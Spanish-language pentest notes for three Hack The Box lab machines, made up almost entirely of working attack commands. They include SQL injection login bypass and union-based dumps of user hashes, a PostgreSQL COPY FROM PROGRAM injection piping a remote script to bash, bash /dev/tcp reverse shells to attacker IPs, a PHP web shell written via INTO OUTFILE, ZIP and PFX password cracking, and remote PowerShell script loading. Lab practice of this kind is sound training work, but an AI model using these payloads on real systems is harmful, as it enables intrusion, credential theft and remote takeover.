
# HTB: Toolbox

## Reconocimiento 
	ping -c1 $target
		* ttl 128 -> Windows
		* ttl 64 -> Linux
	nmap -p- --open -sS --min-rate=20000 -n -Pn $target -vvv -oG allPorts -> Grep
		* Utilizar extractPorts allPorts
	nmap -p21,22,135,139,443,445,5985,47001,49667,49669 -sCV $target -oN targeted

**Utilizamos "crackmapexec" para identificar la maquina victima debido a que tiene el puerto 445 habilitado**
	crackmapexec smb $target

**Validamos si existen recursos compartidos con NullSesion**
	smbclient -L $target -N

**Ver información del certificado**
	openssl s_client -connect $target:443

**En la web hay un SQLi**
	Retorna la query al identificar el SQLI
		Modificamos la consulta hasta que podamos explotar el SQLi bypass de login
		username=admin&password=')or+1%3d1--;
	Otra forma es con sqlmap guardando el Request de Burp como archivo y obtenemos shell
		sqlmap -r login.req --risk=3 --level=3 --batch --force-ssl --os-shell
	Obtenemos una shell remota
		bash -c 'bash -i >& /dev/tcp/10.10.15.242/443 0>&1'
**Otra forma**
https://hacktricks.wiki/en/network-services-pentesting/pentesting-postgresql.html?highlight=rce%20from%20version%209.3%20postgres#rce-to-program

	username=';COPY+cmd_exec+FROM+PROGRAM+'curl+10.10.15.242/shell|bash'%3b-- -&password='
	Levantamos una servicio http con python y disponibilizamos nuestra revershell
	#!/bin/bash
	bash -i >& /dev/tcp/10.15.242/443 0>&1

**Crear consola interactiva**
	script /dev/null -c bash
	ctrl+z
	stty raw -echo; fg
	reset xterm
	echo $TERM
	export TERM=xterm
	stty rows 16 columns 236

	python3 -c 'import pty; pty.spawn("/bin/bash")'
	
**Validar si tiene ssh habilitado**
	(echo '' > /dev/tcp/IP/22) 2>/dev/null && echo "Puerto abierto" || echo "Puerto cerrado"

**Busca archivos**
find / -name archivo.txt 2>/dev/null


# HTB: TimeLapse

Se identifica durante el proceso de reconocimiento smb habilitado utilizamos:

	smbmap -H $TARGET -u 'null' -> -H Hots -u '' Usuario

![[Pasted image 20260705162738.png]]

	smbclient -L $TARGET -N

![[Pasted image 20260705162906.png]]
	Nos conectamos al recurso Shares
	smbclient //$TARGET/Shares -N
	descargamos recursos con get winrm_backup.zip --> posee contraseña

**Cracking de contraseña a archivo ZIP con fuerza bruta**
	7zip l winrm_backup.zip --> Listamos contenido
	unzip winrm_backup.zip --> Descomprimir archivo
	**Usando fcrackzip**
	fcrackzip -v -u -D -p /usr/share/wordlists/rockyou.txt winrm_backup.zip
	**Usando John**
	zip2john winrm_backup.zip > zip.john
	john zip.john --wordlist:/usr/share/wordlists/rockyou.txt
**Extraer una clave privada de una archivo PFX + fuerzabruta**
	openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out key.pem -nodes --> Posee contraseña
	**Usamos John pxf2john**
	pfx2john egacyy_dev_auth.pfx > pfx.john
	john pfx.john --wordlist:/usr/share/wordlists/rockyou.txt
	**Usamos crackpkcs12** 
	https://github.com/crackpkcs12/crackpkcs12
	crackpkcs12 -d /usr/share/wordlists/rockyou.txt -v legacyy_dev_auth.pfx
	openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out key.pem -nodes --> Generamos pkey
	openssl pkcs12 -in legacyy_dev_auth.pfx -nokeys -out cert.pem --> Generamos Cert
**Autenticación en Win-RmS puerto 5986(WinRM Seguro) - 5985(WinRM No Seguro)**
	evil-winrm -i $TARGET -c cert.pem -k key.pem -S (-S es por WinRm Seguro)
	Una vez teniendo autenticación recorrer las carpetas para buscar una brecha potencial para escalar privilegios.
	**Reconocimiento dentro de la maquina**
		whoami /priv
		net users
		Miramos historial de comandos del usuario 
		type AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
		Se identifica la contraseña del usuario svc_deploy que tiene privilegios de read_lpas
		Nos autenticamos como svc_deploy y cargamos el script de ps1 a la maquina victima
		https://github.com/kfosaaen/Get-LAPSPasswords
		IEX(New-Object Net.WebClient).downloadString('http://10.10.15.252/Get-LAPSPasswords.ps1')
		Ejecutamos el Ps1
		No entrega las contraseñas de los usuario en la maquina con LPAS

# HTB: Validation

Se identifica que posee una pagina web vulnerable a SQLi en el campo country.
	username=admin&country=Brazil' union select database()-- -
		La base de datos se llama registration.
	**Listamos todas las bases de datos disponibles en la BD**
		username=admin&country=Brazil' union select schema_name from information_schema.schemata-- -
	**Listamos todas las tablas dentro de la BD registration**
		username=admin&country=Brazil' union select table_name from information_schema.tables where table_schema="registration"-- -
	**Listamos las columnas de la tabla**
		username=admin&country=Brazil' union select column_name from information_schema.columns where table_schema="registration" and table_name="registration"-- -
	**Agrupamos la salida para ver los datos de las columnas**
		username=admin&country=Brazil' union select group_concat(username,":",userhash) from registration-- -
	**Validamos si podemos crear archivos en el servidor**
		username=admin&country=Brazil' union select "<?php system($_REQUEST['cmd']); ?>" into outfile "/var/www/html/prueba.php"-- -
	**Mediante Curl creamos ejecutamos una revershell**
		curl $TARGET/prueba.php --data-urlencode 'cmd=bash -c "bash -i >& /dev/tcp/10.10.15.212/443 0>&1"'